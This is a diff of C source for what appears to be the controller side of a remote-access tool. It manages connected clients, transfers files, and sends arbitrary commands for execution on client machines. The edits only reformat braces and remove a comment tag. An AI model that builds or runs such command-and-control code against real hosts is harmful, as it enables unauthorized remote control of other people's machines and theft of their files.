@@ -1,7 +1,6 @@
 /*
 Coded by d4rkstat1c.
 Use this code educationally/legally.
-#GSH
 */
 #include <stdio.h> 
 #include <netdb.h>
@@ -157,9 +156,8 @@ void list_connections(const Conn_map* conns) {
 	printf("---------------------------\n\n");
 
 	if (conns->size) {
-		for (size_t i = 0; i < conns->size; i++) {
+		for (size_t i = 0; i < conns->size; i++)
 			printf("%s: %lu\n", conns->clients[i].host, i);
-		}
 		printf("\n\n");
 	}
 	else {
@@ -202,13 +200,11 @@ int send_file(char* const buf, const size_t cmd_len, int client_socket) {
 		// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
 		int bytes_read;
 		while (!feof(fd) && i_result > 0) {
-			if (bytes_read = fread(buf, 1, BUFLEN, fd)) {
+			if (bytes_read = fread(buf, 1, BUFLEN, fd))
 				// Send file's bytes chunk to remote server.
 				i_result = write(client_socket, buf, bytes_read);
-			}
-			else {
+			else
 				break;
-			}
 		}
 		// Close the file.
 		fclose(fd);
@@ -313,10 +309,9 @@ const func parse_cmd(char* const buf) {
 	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file};
 
 	// Parse stdin string and return it's corresponding function pointer.
-	for (int i = 0; i < 4; i++) {
+	for (int i = 0; i < 4; i++)
 		if (compare(buf, commands[i]))
 			return func_array[i];
-	}
 
 	// If no command was parsed: send/execute the command string on the client via _popen().
 	return &send_cmd;
@@ -446,9 +441,8 @@ int main(void) {
 				pthread_cancel(acp_thread);
 				// if there's any connections close them before exiting.
 				if (conns.size) {
-					for (size_t i = 0; i < conns.size; i++) {
+					for (size_t i = 0; i < conns.size; i++)
 						close(conns.clients[i].sock);
-					}
 					// Free allocated memory.
 					free(conns.clients);
 				}
@@ -467,12 +461,10 @@ int main(void) {
 				// Interact with client.
 				int client_id;
 				client_id = atoi(&cmd[9]);
-				if (!conns.size || client_id < 0 || client_id > conns.size - 1) {
+				if (!conns.size || client_id < 0 || client_id > conns.size - 1)
 					printf("Invalid client identifier.\n");
-				}
-				else {
+				else
 					interact(&conns, buf, client_id);
-				}
 			}
 			else {
 				// Execute command on host system.
